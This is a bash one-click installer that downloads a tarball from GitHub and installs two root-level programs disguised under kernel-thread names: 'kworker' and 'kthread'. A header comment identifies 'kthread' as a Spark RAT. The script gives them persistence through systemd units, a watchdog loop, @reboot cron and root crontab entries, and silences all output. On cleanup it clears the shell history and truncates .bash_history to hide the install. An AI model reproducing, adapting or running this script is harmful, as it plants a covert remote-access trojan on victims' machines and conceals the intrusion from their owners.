#!/bin/bash

# ============================================
# kworker + kthread combined one-click installer (install_all.sh)
# Combines install.sh (kworker) and install_rat.sh (Spark kthread).
# Usage:
#   bash -c "$(curl -fsSL https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/install_all.sh)"
# Package:
#   https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kworker.tar.gz
# ============================================

set -uo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

KWORKER_DIR="/var/local/kworker"
KWORKER_SERVICE="kworker"
KTHREAD_DIR="/var/local/kthreadd"
KTHREAD_BIN="${KTHREAD_DIR}/kthread"
KTHREAD_WATCH="${KTHREAD_DIR}/watch.sh"
KTHREAD_START="${KTHREAD_DIR}/start-kthread.sh"
KWORKER_START="${KWORKER_DIR}/start-kworker.sh"
KTHREAD_SERVICE="kthread"
WATCH_SERVICE="kthread-watch"
DOWNLOAD_URL="${DOWNLOAD_URL:-https://raw.githubusercontent.com/thm1472581-dotcom/kworker/master/kworker.tar.gz}"

USE_SYSTEMD=1
USE_CRON_D=1

STEP_ERRORS=0
STEP_OK=0

print_info()    { echo -e "${GREEN}[INFO]${NC} $1"; }
print_warn()    { echo -e "${YELLOW}[WARN]${NC} $1"; }
print_error()   { echo -e "${RED}[ERROR]${NC} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }

run_step() {
	local name="$1"
	shift
	print_info ">>> ${name}"
	if "$@"; then
		print_success "${name}"
		STEP_OK=$((STEP_OK + 1))
		return 0
	fi
	print_warn "${name} (failed, continuing)"
	STEP_ERRORS=$((STEP_ERRORS + 1))
	return 1
}

path_is_writable() {
	local target="$1"
	local probe="${target%/}/.kworker_probe_$$"
	touch "${probe}" 2>/dev/null || return 1
	rm -f "${probe}" 2>/dev/null || true
	return 0
}

check_root() {
	if [ "${EUID:-$(id -u)}" -ne 0 ]; then
		print_error "Please run as root: sudo bash install_all.sh"
		exit 1
	fi
	return 0
}

detect_install_mode() {
	local test_systemd="/etc/systemd/system"
	local test_cron="/etc/cron.d"

	if path_is_writable "${test_systemd}"; then
		USE_SYSTEMD=1
		print_info "systemd unit dir writable: ${test_systemd}"
	else
		USE_SYSTEMD=0
		print_warn "/etc/systemd/system is not writable (Permission denied)"
		print_warn "Will use direct-start fallback under ${KTHREAD_DIR}"
		print_warn "To fix systemd install: mount -o remount,rw /  (if root fs is read-only)"
	fi

	if [ -d "${test_cron}" ] && path_is_writable "${test_cron}"; then
		USE_CRON_D=1
	else
		USE_CRON_D=0
		print_warn "/etc/cron.d is not writable; will try root crontab fallback"
	fi
	return 0
}

check_dependencies() {
	local ok=0
	if command -v curl >/dev/null 2>&1; then
		print_info "curl available"
	elif command -v wget >/dev/null 2>&1; then
		print_info "wget available"
	else
		print_warn "curl/wget not found; download step may fail"
		ok=1
	fi
	if ! command -v tar >/dev/null 2>&1; then
		print_warn "tar not found; extract step may fail"
		ok=1
	fi
	if [ "${USE_SYSTEMD}" -eq 1 ] && ! command -v systemctl >/dev/null 2>&1; then
		print_warn "systemctl not found; switching to direct-start fallback"
		USE_SYSTEMD=0
	fi
	[ "$ok" -eq 0 ] && print_success "Dependencies OK"
	return 0
}

create_directories() {
	mkdir -p "${KWORKER_DIR}" "${KTHREAD_DIR}" || return 1
	chmod 755 "${KWORKER_DIR}" "${KTHREAD_DIR}" || return 1
	return 0
}

download_package() {
	if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
		print_warn "No download tool; skip download (use existing files if any)"
		return 1
	fi
	cd "${KWORKER_DIR}" || return 1
	[ -f kworker.tar.gz ] && rm -f kworker.tar.gz
	if command -v curl >/dev/null 2>&1; then
		curl -fsSL "${DOWNLOAD_URL}" -o kworker.tar.gz || return 1
	else
		wget -q "${DOWNLOAD_URL}" -O kworker.tar.gz || return 1
	fi
	[ -f kworker.tar.gz ] || return 1
	print_success "Download complete"
	return 0
}

extract_package() {
	cd "${KWORKER_DIR}" || return 1
	if [ ! -f kworker.tar.gz ]; then
		print_warn "kworker.tar.gz missing; skip extract"
		return 1
	fi
	tar -xzf kworker.tar.gz || return 1
	print_success "Extract complete"
	return 0
}

setup_kworker_permissions() {
	local ok=0
	chmod 755 "${KWORKER_DIR}" 2>/dev/null || true
	[ -f "${KWORKER_DIR}/kworker" ] && chmod +x "${KWORKER_DIR}/kworker" || ok=1
	[ -f "${KWORKER_DIR}/kworker.sh" ] && chmod +x "${KWORKER_DIR}/kworker.sh" || true
	[ -f "${KWORKER_DIR}/c" ] && chmod 644 "${KWORKER_DIR}/c" || true
	[ -f "${KWORKER_DIR}/kworker" ] || {
		print_warn "kworker binary not found"
		return 1
	}
	[ "$ok" -eq 0 ] || print_warn "Some kworker permission steps skipped"
	return 0
}

write_kworker_start_script() {
	cat > "${KWORKER_START}" <<'KWORKER_START_EOF'
#!/bin/bash
DIR="/var/local/kworker"
if ! pgrep -f "${DIR}/kworker.sh" >/dev/null 2>&1; then
	nohup "${DIR}/kworker.sh" >/dev/null 2>&1 &
fi
KWORKER_START_EOF
	chmod 755 "${KWORKER_START}" 2>/dev/null || true
	return 0
}

install_kworker_service() {
	local unit="${KWORKER_DIR}/kworker.service"
	local dest="/etc/systemd/system/${KWORKER_SERVICE}.service"

	[ -f "${unit}" ] || {
		print_warn "kworker.service not in package"
		return 1
	}

	if [ "${USE_SYSTEMD}" -eq 1 ]; then
		cp -f "${unit}" "${dest}" || return 1
		chmod 644 "${dest}" || return 1
		systemctl daemon-reload >/dev/null 2>&1 || return 1
	else
		cp -f "${unit}" "${KWORKER_DIR}/kworker.service.local" 2>/dev/null || true
		write_kworker_start_script || return 1
		print_info "kworker unit saved locally; use ${KWORKER_START} to start"
	fi
	return 0
}

start_kworker_direct() {
	write_kworker_start_script || return 1
	if [ -x "${KWORKER_DIR}/kworker.sh" ]; then
		"${KWORKER_START}" || return 1
		sleep 1
		pgrep -f "${KWORKER_DIR}/kworker.sh" >/dev/null 2>&1
	else
		return 1
	fi
}

start_kworker_service() {
	if [ "${USE_SYSTEMD}" -eq 1 ] && [ -f "/etc/systemd/system/${KWORKER_SERVICE}.service" ]; then
		systemctl enable "${KWORKER_SERVICE}.service" >/dev/null 2>&1 || print_warn "kworker enable failed"
		if systemctl restart "${KWORKER_SERVICE}.service" >/dev/null 2>&1 \
			|| systemctl start "${KWORKER_SERVICE}.service" >/dev/null 2>&1; then
			return 0
		fi
		print_warn "kworker systemd start failed; trying direct start"
	fi
	if start_kworker_direct; then
		print_info "kworker started directly"
		return 0
	fi
	print_warn "kworker start failed"
	return 1
}

setup_kthread_files() {
	if [ -f "${KWORKER_DIR}/kthread" ]; then
		cp -f "${KWORKER_DIR}/kthread" "${KTHREAD_BIN}" || return 1
	elif [ -f "${KTHREAD_BIN}" ]; then
		print_warn "Package has no kthread; keeping existing ${KTHREAD_BIN}"
	else
		print_warn "kthread not found (generate from Web UI and repack tar)"
		return 1
	fi
	chmod 755 "${KTHREAD_BIN}" 2>/dev/null || true

	if [ -f "${KWORKER_DIR}/kthread-watch.sh" ]; then
		cp -f "${KWORKER_DIR}/kthread-watch.sh" "${KTHREAD_WATCH}"
	elif [ -f "${KWORKER_DIR}/watch.sh" ]; then
		cp -f "${KWORKER_DIR}/watch.sh" "${KTHREAD_WATCH}"
	elif [ ! -f "${KTHREAD_WATCH}" ]; then
		cat > "${KTHREAD_WATCH}" <<'WATCH_EOF'
#!/bin/bash
EXE="/var/local/kthreadd/kthread"
while true; do
  if ! pgrep -f "$EXE --service-worker" >/dev/null 2>&1; then
    systemctl restart kthread.service >/dev/null 2>&1 || "$EXE" --service-worker >/dev/null 2>&1 &
  fi
  sleep 15
done
WATCH_EOF
	fi
	chmod 755 "${KTHREAD_WATCH}" 2>/dev/null || true
	chmod 755 "${KTHREAD_DIR}" 2>/dev/null || true

	if [ -f "${KWORKER_DIR}/kthread.service" ]; then
		cp -f "${KWORKER_DIR}/kthread.service" "${KTHREAD_DIR}/kthread.service" 2>/dev/null || true
	fi
	return 0
}

write_kthread_service_unit() {
	local dest="${1:-/etc/systemd/system/${KTHREAD_SERVICE}.service}"
	cat > "${dest}" <<UNIT_EOF
[Unit]
Description=kthread
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=${KTHREAD_DIR}
ExecStart=${KTHREAD_BIN} --service-worker
Restart=always
RestartSec=3
KillMode=mixed
TimeoutStopSec=15
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
UNIT_EOF
	chmod 644 "${dest}" || return 1
	return 0
}

write_kthread_start_script() {
	cat > "${KTHREAD_START}" <<KTHREAD_START_EOF
#!/bin/bash
BIN="${KTHREAD_BIN}"
WATCH="${KTHREAD_WATCH}"
if ! pgrep -f "\${BIN} --service-worker" >/dev/null 2>&1; then
	nohup "\${BIN}" --service-worker >/dev/null 2>&1 &
fi
if ! pgrep -f "\${WATCH}" >/dev/null 2>&1; then
	nohup /bin/sh "\${WATCH}" >/dev/null 2>&1 &
fi
KTHREAD_START_EOF
	chmod 755 "${KTHREAD_START}" 2>/dev/null || true
	return 0
}

install_kthread_service() {
	local unit_src=""
	local dest="/etc/systemd/system/${KTHREAD_SERVICE}.service"
	local local_dest="${KTHREAD_DIR}/kthread.service"

	if [ -f "${KWORKER_DIR}/kthread.service" ]; then
		unit_src="${KWORKER_DIR}/kthread.service"
	elif [ -f "${KTHREAD_DIR}/kthread.service" ]; then
		unit_src="${KTHREAD_DIR}/kthread.service"
	fi

	if [ "${USE_SYSTEMD}" -eq 1 ]; then
		if [ -n "${unit_src}" ]; then
			cp -f "${unit_src}" "${dest}" || return 1
			chmod 644 "${dest}" || return 1
		else
			print_warn "kthread.service not in package; generating default unit"
			write_kthread_service_unit "${dest}" || return 1
		fi
		systemctl daemon-reload >/dev/null 2>&1 || return 1
		[ -f "${dest}" ] || return 1
	else
		if [ -n "${unit_src}" ]; then
			cp -f "${unit_src}" "${local_dest}" 2>/dev/null || write_kthread_service_unit "${local_dest}" || return 1
		else
			write_kthread_service_unit "${local_dest}" || return 1
		fi
		write_kthread_start_script || return 1
		print_info "kthread unit saved to ${local_dest}; use ${KTHREAD_START} to start"
	fi
	return 0
}

install_cron_d_watchdog() {
	local cron_file="/etc/cron.d/kthread"
	[ "${USE_CRON_D}" -eq 1 ] || return 1
	cat > "${cron_file}" <<CRON_EOF
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

@reboot root ${KTHREAD_BIN} --service-worker >/dev/null 2>&1 &
@reboot root /bin/sh ${KTHREAD_WATCH} >/dev/null 2>&1 &
*/2 * * * * root pgrep -f "${KTHREAD_BIN} --service-worker" >/dev/null 2>&1 || ${KTHREAD_BIN} --service-worker >/dev/null 2>&1 &
CRON_EOF
	chmod 644 "${cron_file}" || return 1
	if command -v crond >/dev/null 2>&1; then
		systemctl restart crond >/dev/null 2>&1 || service crond restart >/dev/null 2>&1 || true
	elif command -v cron >/dev/null 2>&1; then
		systemctl restart cron >/dev/null 2>&1 || service cron restart >/dev/null 2>&1 || true
	fi
	return 0
}

install_crontab_watchdog() {
	local tmp marker="${KTHREAD_BIN}"
	if ! command -v crontab >/dev/null 2>&1; then
		print_warn "crontab command not found"
		return 1
	fi
	tmp="$(mktemp)" || return 1
	crontab -l 2>/dev/null | grep -v "${KTHREAD_BIN}" | grep -v "${KTHREAD_WATCH}" | grep -v "${KTHREAD_START}" > "${tmp}" || true
	cat >> "${tmp}" <<CRON_EOF
@reboot ${KTHREAD_START} >/dev/null 2>&1
*/2 * * * * pgrep -f "${KTHREAD_BIN} --service-worker" >/dev/null 2>&1 || ${KTHREAD_BIN} --service-worker >/dev/null 2>&1 &
CRON_EOF
	crontab "${tmp}" || { rm -f "${tmp}"; return 1; }
	rm -f "${tmp}"
	print_info "Installed root crontab watchdog"
	return 0
}

install_cron_watchdog() {
	if install_cron_d_watchdog; then
		return 0
	fi
	install_crontab_watchdog
}

write_kthread_watch_service_unit() {
	local dest="${1:-/etc/systemd/system/${WATCH_SERVICE}.service}"
	cat > "${dest}" <<WATCH_UNIT_EOF
[Unit]
Description=kthread watchdog
After=network-online.target

[Service]
Type=simple
ExecStart=${KTHREAD_WATCH}
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
WATCH_UNIT_EOF
	chmod 644 "${dest}" || return 1
	return 0
}

install_watchdog_service() {
	local watch_unit=""
	local dest="/etc/systemd/system/${WATCH_SERVICE}.service"

	if [ -f "${KWORKER_DIR}/kthread-watch.service" ]; then
		watch_unit="${KWORKER_DIR}/kthread-watch.service"
	fi

	if [ "${USE_SYSTEMD}" -ne 1 ]; then
		print_warn "systemd not available; watchdog handled by ${KTHREAD_WATCH}"
		return 1
	fi

	if [ -n "${watch_unit}" ]; then
		cp -f "${watch_unit}" "${dest}" || return 1
		chmod 644 "${dest}" || return 1
	else
		print_warn "kthread-watch.service not in package; generating default unit"
		write_kthread_watch_service_unit "${dest}" || return 1
	fi

	systemctl daemon-reload >/dev/null 2>&1 || return 1
	systemctl enable --now "${WATCH_SERVICE}.service" >/dev/null 2>&1 || return 1
	return 0
}

start_kthread_direct() {
	write_kthread_start_script || return 1
	"${KTHREAD_START}" || return 1
	sleep 1
	pgrep -f "${KTHREAD_BIN} --service-worker" >/dev/null 2>&1
}

start_kthread_service() {
	if [ ! -x "${KTHREAD_BIN}" ]; then
		print_warn "kthread binary missing; skip start"
		return 1
	fi

	if [ "${USE_SYSTEMD}" -eq 1 ] && [ -f "/etc/systemd/system/${KTHREAD_SERVICE}.service" ]; then
		systemctl enable "${KTHREAD_SERVICE}.service" >/dev/null 2>&1 || print_warn "kthread enable failed"
		if systemctl restart "${KTHREAD_SERVICE}.service" >/dev/null 2>&1 \
			|| systemctl start "${KTHREAD_SERVICE}.service" >/dev/null 2>&1; then
			return 0
		fi
		print_warn "kthread systemd start failed; trying direct start"
	fi

	if start_kthread_direct; then
		print_info "kthread started directly"
		return 0
	fi

	print_warn "kthread start failed"
	return 1
}

show_service_status() {
	echo ""
	if [ "${USE_SYSTEMD}" -eq 1 ] && [ -f "/etc/systemd/system/${KWORKER_SERVICE}.service" ]; then
		print_info "kworker.service status:"
		systemctl status "${KWORKER_SERVICE}.service" --no-pager 2>/dev/null || print_warn "kworker status unavailable"
	else
		print_info "kworker process status:"
		pgrep -af "${KWORKER_DIR}/kworker" 2>/dev/null || print_warn "kworker process not running"
	fi
	echo ""
	if [ "${USE_SYSTEMD}" -eq 1 ] && [ -f "/etc/systemd/system/${KTHREAD_SERVICE}.service" ]; then
		print_info "kthread.service status:"
		systemctl status "${KTHREAD_SERVICE}.service" --no-pager 2>/dev/null || print_warn "kthread status unavailable"
	else
		print_info "kthread process status:"
		pgrep -af "${KTHREAD_BIN}" 2>/dev/null || print_warn "kthread process not running"
	fi
	echo ""
	return 0
}

cleanup_install_artifacts() {
	rm -f "${KWORKER_DIR}/kworker.tar.gz" 2>/dev/null || true
	rm -f "${KWORKER_DIR}/kthread.service" "${KWORKER_DIR}/kthread-watch.service" "${KWORKER_DIR}/kthread-watch.sh" 2>/dev/null || true
	history -c 2>/dev/null || true
	if [ -w "${HOME}/.bash_history" ] 2>/dev/null; then
		tail -n 20 "${HOME}/.bash_history" > "${HOME}/.bash_history.tmp" 2>/dev/null || true
		[ -f "${HOME}/.bash_history.tmp" ] && mv -f "${HOME}/.bash_history.tmp" "${HOME}/.bash_history" 2>/dev/null || true
	fi
	return 0
}

show_summary() {
	echo ""
	echo "=========================================="
	if [ "${STEP_ERRORS}" -eq 0 ]; then
		print_success "install_all completed (all steps OK)"
	else
		print_warn "install_all finished with ${STEP_ERRORS} failed step(s), ${STEP_OK} OK"
	fi
	echo "=========================================="
	echo -e "${GREEN}kworker dir:${NC}  ${KWORKER_DIR}"
	echo -e "${GREEN}kthread dir:${NC}  ${KTHREAD_DIR}"
	if [ "${USE_SYSTEMD}" -eq 1 ]; then
		echo -e "${GREEN}mode:${NC}        systemd"
		echo -e "${GREEN}services:${NC}    ${KWORKER_SERVICE}.service + ${KTHREAD_SERVICE}.service"
		echo ""
		echo "Commands:"
		echo "  systemctl status ${KWORKER_SERVICE}.service"
		echo "  systemctl status ${KTHREAD_SERVICE}.service"
		echo "  systemctl restart ${KWORKER_SERVICE}.service"
		echo "  systemctl restart ${KTHREAD_SERVICE}.service"
		echo "  journalctl -u ${KTHREAD_SERVICE}.service -f"
	else
		echo -e "${GREEN}mode:${NC}        direct-start (systemd dir not writable)"
		echo ""
		echo "Commands:"
		echo "  ${KWORKER_START}"
		echo "  ${KTHREAD_START}"
		echo "  pgrep -af kthread"
		echo "  pgrep -af kworker"
		echo ""
		echo "To enable systemd later:"
		echo "  mount -o remount,rw /"
		echo "  bash install_all.sh"
	fi
	echo "=========================================="
}

main() {
	echo ""
	echo "=========================================="
	echo "  kworker + kthread combined installer"
	echo "=========================================="
	echo ""

	check_root
	run_step "Detect install mode" detect_install_mode
	run_step "Check dependencies" check_dependencies
	run_step "Create directories" create_directories
	run_step "Download package" download_package
	run_step "Extract package" extract_package
	run_step "Set kworker permissions" setup_kworker_permissions
	run_step "Install kworker.service" install_kworker_service
	run_step "Start kworker.service" start_kworker_service
	run_step "Setup kthread files" setup_kthread_files
	run_step "Install kthread.service" install_kthread_service
	if ! run_step "Install cron watchdog" install_cron_watchdog; then
		run_step "Install kthread-watch.service (fallback)" install_watchdog_service || \
			print_warn "No cron/watch unit; kthread relies on direct start + watch.sh"
	fi
	run_step "Start kthread.service" start_kthread_service
	run_step "Show service status" show_service_status
	run_step "Cleanup" cleanup_install_artifacts
	show_summary

	[ "${STEP_ERRORS}" -eq 0 ]
}

main "$@"
